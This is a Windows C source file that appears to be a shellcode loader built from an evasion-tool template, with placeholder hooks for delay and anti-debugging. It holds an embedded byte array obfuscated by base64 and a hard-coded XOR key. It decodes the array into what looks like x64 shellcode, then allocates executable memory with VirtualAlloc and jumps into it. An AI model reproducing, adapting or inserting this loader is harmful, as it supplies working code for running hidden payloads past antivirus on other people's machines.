#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <wincrypt.h>

//####DEFINE####

int base64_decode_16ceb4574dd64fe58240393d26d30473(unsigned char* data, int data_len)
 {
    DWORD base64_len = 0;
    BOOL result;

    // Step 1: Convert hex representation to Base64 encoded string

    // Get the required size for the base64 encoded string
    if (!CryptBinaryToStringA(data, data_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64_len)) {
        fprintf(stderr, "Error getting required size for base64 encoding. Error code: %lu\n", GetLastError());
        return -1;
    }

    // Allocate memory for the base64 encoded string
    unsigned char* base64_encoded = (unsigned char*)malloc(base64_len);
    if (base64_encoded == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return -1;
    }

    // Perform the conversion to base64
    if (!CryptBinaryToStringA(data, data_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, (LPSTR)base64_encoded, &base64_len)) {
        fprintf(stderr, "Error converting hex to base64. Error code: %lu\n", GetLastError());
        free(base64_encoded);
        return -1;
    }

    // Print the Base64 string
    printf("Base64 encoded data: %.*s\n", base64_len, base64_encoded);

    // Step 2: Decode the Base64 string
    DWORD decoded_len = 0;

    // First, call CryptStringToBinaryA to get the required size for the decoded data
    result = CryptStringToBinaryA((LPCSTR)base64_encoded, base64_len, CRYPT_STRING_BASE64, NULL, &decoded_len, NULL, NULL);
    if (!result) {
        fprintf(stderr, "Error getting decoded length. Error code: %lu\n", GetLastError());
        free(base64_encoded);
        return -1;
    }

    unsigned char* decoded_data = (unsigned char*)malloc(decoded_len);
    if (decoded_data == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        free(base64_encoded);
        return -1;
    }

    // Now, decode the base64 data
    result = CryptStringToBinaryA((LPCSTR)base64_encoded, base64_len, CRYPT_STRING_BASE64, decoded_data, &decoded_len, NULL, NULL);
    if (!result) {
        fprintf(stderr, "Error decoding base64 data. Error code: %lu\n", GetLastError());
        free(base64_encoded);
        free(decoded_data);
        return -1;
    }

    // Copy the decoded data back to the original data buffer
    memcpy(data, decoded_data, decoded_len);

    free(base64_encoded);
    free(decoded_data);

    return decoded_len;
}int xor_encode_da02e9336aa441819ad4a4a4b75f943c(unsigned char* data, int data_len)
{
    const char* key = "ceL0%cylETuW";
    int key_len = 12;
    
    printf("\n");
    printf("DEBUG:Before XOR:");
    printf("key %s \n", key);
    for (size_t i = 0; i < data_len; i++) {
        printf("0x%02x,", data[i]);
    }
    printf("\n\n");

    for (int i = 0; i < data_len; i++){
        data[i] = (data[i] ^ (unsigned char)key[i % key_len]);
    }


    printf("\n");
    printf("DEBUG:After XOR:");
    for (size_t i = 0; i < data_len; i++) {
        printf("0x%02x,", data[i]);
    }
    printf("\n\n");

    return data_len;
}



DWORD WINAPI esc_main(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    const unsigned char raw[] = {0x9f,0x2d,0xcf,0xd4,0xd5,0x8b,0xb9,0x6c,0x45,0x54,0x34,0x06,0x22,0x35,0x1e,0x61,0x73,0x2b,0x48,0xbe,0x20,0x1c,0xfe,0x05,0x03,0x2d,0xc7,0x62,0x3d,0x2b,0xf2,0x3e,0x65,0x1c,0xfe,0x25,0x33,0x2d,0x43,0x87,0x6f,0x29,0x34,0x5d,0x8c,0x1c,0x44,0x97,0xcf,0x59,0x2d,0x4c,0x27,0x4f,0x59,0x2d,0x84,0x9d,0x78,0x16,0x62,0xa4,0xae,0xdd,0x77,0x22,0x28,0x24,0xce,0x06,0x55,0xdc,0x21,0x59,0x04,0x31,0xf5,0xe8,0xf9,0xe4,0x45,0x54,0x75,0x1f,0xe6,0xa5,0x38,0x57,0x6d,0x62,0xa9,0x3c,0xce,0x1c,0x6d,0x13,0xe8,0x25,0x6c,0x79,0x24,0xb3,0x9a,0x3a,0x0d,0xab,0xbc,0x16,0xe8,0x51,0xc4,0x78,0x24,0xb5,0x34,0x5d,0x8c,0x1c,0x44,0x97,0xcf,0x24,0x8d,0xf9,0x28,0x22,0x78,0xad,0x7d,0xb4,0x00,0xa6,0x2f,0x66,0x00,0x14,0x2d,0x26,0x40,0xbd,0x30,0x8c,0x2d,0x13,0xe8,0x25,0x68,0x79,0x24,0xb3,0x1f,0x2d,0xce,0x58,0x3d,0x13,0xe8,0x25,0x50,0x79,0x24,0xb3,0x38,0xe7,0x41,0xdc,0x3d,0x56,0xb3,0x24,0x14,0x71,0x7d,0x3d,0x20,0x36,0x04,0x0c,0x34,0x0e,0x22,0x3f,0x04,0xb3,0xc9,0x43,0x38,0x3e,0xba,0xb4,0x2d,0x16,0x3a,0x3f,0x04,0xbb,0x37,0x8a,0x2e,0x93,0xba,0xab,0x28,0x1f,0xd9,0x64,0x4c,0x30,0x25,0x63,0x79,0x6c,0x45,0x1c,0xf8,0xda,0x62,0x64,0x4c,0x30,0x64,0xd9,0x48,0xe7,0x2a,0xd3,0x8a,0x82,0xd8,0x95,0xf9,0x92,0x73,0x22,0xc3,0xca,0xd0,0xe9,0xe8,0xa8,0xb6,0x2d,0xcf,0xf4,0x0d,0x5f,0x7f,0x10,0x4f,0xd4,0x8e,0xb7,0x16,0x60,0xf7,0x77,0x36,0x11,0x16,0x06,0x45,0x0d,0x34,0xde,0xb9,0x9a,0x99,0x53,0x44,0x0f,0x1a,0x42,0x20,0x2c,0x10,0x57};
    int length = sizeof(raw);

    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
    memcpy(encoded, raw, length);
    //SIZE_T bytesWritten;

    length = base64_decode_16ceb4574dd64fe58240393d26d30473(encoded, length);length = xor_encode_da02e9336aa441819ad4a4a4b75f943c(encoded, length);

    unsigned char* decoded = encoded;

    //currentProcess = GetCurrentProcess();

    printf("[*] Allocating %d bytes of memory\n", length);
    void *exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL)
        return -1;

    bool success = false;
    success = memcpy(exec, decoded, length);
    if (!success){
        printf("[-] Oh gosh, something went wrong!\n");
        return -2;
    }
    
    int ret_val = 0;
    printf("[*] Executing\n");
    ((void (*)())exec)();
    
    printf("[+] The shellcode finished with a return value: %08X\n", ret_val);
    return 0;
}

int main()
{
    //####DELAY####
    //####ANTIDEBUG####
    //####ARGS####

    esc_main(NULL);
}
